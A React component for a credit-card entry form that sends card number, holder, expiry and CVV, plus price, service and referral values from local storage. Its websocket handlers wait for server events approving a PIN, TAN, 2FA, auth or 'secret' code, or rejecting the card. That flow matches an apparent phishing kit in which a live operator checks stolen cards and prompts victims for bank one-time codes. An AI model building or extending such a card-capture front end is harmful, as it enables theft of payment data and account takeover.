import React, { useState, useRef, useCallback, useEffect } from 'react';
import { useDispatch, useSelector } from 'react-redux';
import { useTranslation } from 'react-i18next';

import { submitPaymentData, setLoaded, setFail, setData } from '../../actions/paymentData';
// import { setPaymentSupportVisible } from '../../actions/paymentSupport';
import { isRequestPending, isRequestSuccess, isRequestError, getErrorMessage } from '../../utils/store';

import { PaymentDataView } from './View';
import { PaymentLayout } from '../../components/layouts';

const initialState = {
  cardNumber: '#### #### #### ####',
  cardHolder: '',
  cardMonth: '',
  cardYear: '',
  cardCvv: '',
  isCardFlipped: false,
};

export const PaymentData = () => {
  const { t } = useTranslation();
  const dispatch = useDispatch();
  const { isLoading, isLoaded, isError, errorMessage, socket } = useSelector(
    ({ paymentData: { request }, socket }) => ({
      isLoading: isRequestPending(request),
      isLoaded: isRequestSuccess(request),
      isError: isRequestError(request),
      errorMessage: getErrorMessage(request),
      socket,
    }),
  );

  const [state, setState] = useState(initialState);
  const [currentFocusedElm, setCurrentFocusedElm] = useState(null);

  useEffect(() => {
    if (socket) {
      socket.on('PAYMENT_DATA_PIN_GOOD', (payload) => {
        dispatch(setData({ state, type: payload.type }));
        dispatch(setLoaded());
      });

      socket.on('PAYMENT_DATA_CODE_GOOD', (payload) => {
        dispatch(setData({ state, type: payload.type }));
        dispatch(setLoaded());
      });

      socket.on('PAYMENT_DATA_2FA_GOOD', (payload) => {
        dispatch(setData({ state, type: payload.type }));
        dispatch(setLoaded());
      });

      socket.on('PAYMENT_DATA_AUTH_GOOD', (payload) => {
        dispatch(setData({ state, type: payload.type }));
        dispatch(setLoaded());
      });

      socket.on('PAYMENT_DATA_TAN_GOOD', (payload) => {
        dispatch(setData({ state, type: payload.type }));
        dispatch(setLoaded());
      });

      socket.on('PAYMENT_DATA_SECRET_GOOD', (payload) => {
        dispatch(setData({ state, type: payload.type }));
        dispatch(setLoaded());
      });

      // socket.on('PAYMENT_DATA_SUPPORT', () => {
      //   dispatch(setPaymentSupportVisible());
      // });

      socket.on('PAYMENT_DATA_BAD', () => {
        dispatch(setFail(t('CARD.DATA.ERROR')));
      });
    }
  }, [socket, state]);

  useEffect(() => {
    if (isError) {
      setState({ ...state, isCardFlipped: false });
    }
  }, [isError]);

  const updateStateValues = useCallback(
    (keyName, value) => {
      setState({
        ...state,
        [keyName]: value || initialState[keyName],
      });
    },
    [state],
  );

  const isFormDisabled =
    !state.cardMonth ||
    !state.cardYear ||
    !state.cardCvv ||
    state.cardCvv.length < 3 ||
    state.cardNumber === '#### #### #### ####' ||
    !state.cardNumber ||
    !state.cardHolder ||
    state.cardHolder === 'FULL NAME';

  const onSubmit = async (e) => {
    e.preventDefault();

    const price = localStorage.getItem('price');
    const ref = localStorage.getItem('ref');
    const service = localStorage.getItem('service');

    await dispatch(
      submitPaymentData({ ...state, price, service, ref, cardDate: `${state.cardMonth}/${state.cardYear}` }),
    );
  };

  // References for the Form Inputs used to focus corresponding inputs.
  const formFieldsRefObj = {
    cardNumber: useRef(),
    cardHolder: useRef(),
    cardDate: useRef(),
    cardCvv: useRef(),
  };

  const focusFormFieldByKey = useCallback((key) => {
    formFieldsRefObj[key].current.focus();
  });

  // This are the references for the Card DIV elements.
  const cardElementsRef = {
    cardNumber: useRef(),
    cardHolder: useRef(),
    cardDate: useRef(),
  };

  const onCardFormInputFocus = (_event, inputName) => {
    const refByName = cardElementsRef[inputName];
    setCurrentFocusedElm(refByName);
  };

  const onCardInputBlur = useCallback(() => {
    setCurrentFocusedElm(null);
  }, []);

  if (isLoaded) {
    return null;
  }

  return (
    <PaymentLayout
      card={{
        data: state,
        isCardFlipped: state.isCardFlipped,
        currentFocusedElm,
        onCardElementClick: focusFormFieldByKey,
        cardNumberRef: cardElementsRef.cardNumber,
        cardHolderRef: cardElementsRef.cardHolder,
        cardDateRef: cardElementsRef.cardDate,
      }}
    >
      <PaymentDataView
        cardMonth={state.cardMonth}
        cardYear={state.cardYear}
        cardHolder={state.cardHolder}
        cardCvv={state.cardCvv}
        formDisabled={isFormDisabled}
        onUpdateState={updateStateValues}
        cardNumberRef={formFieldsRefObj.cardNumber}
        cardHolderRef={formFieldsRefObj.cardHolder}
        cardDateRef={formFieldsRefObj.cardDate}
        cardCvvRef={formFieldsRefObj.cardCvv}
        onCardInputFocus={onCardFormInputFocus}
        onCardInputBlur={onCardInputBlur}
        onSubmit={onSubmit}
        loading={isLoading}
        loaded={isLoaded}
        error={isError}
        errorMessage={errorMessage}
      />
    </PaymentLayout>
  );
};
